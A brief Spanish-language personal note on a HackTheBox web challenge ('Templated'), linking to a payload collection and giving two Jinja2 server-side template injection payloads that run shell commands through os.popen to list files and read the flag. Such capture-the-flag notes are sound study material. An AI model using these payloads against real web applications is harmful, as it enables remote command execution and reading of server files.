# Notas sobre desafíos en HackTheBox
  
## Challenges - Web  
https://app.hackthebox.eu/challenges/  

### Templated  

- Template jinja2 utilizado para explotar vulnerabilidad y ver flag  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  

Se usó en la url:  
`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`  
y luego   
`{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}`  


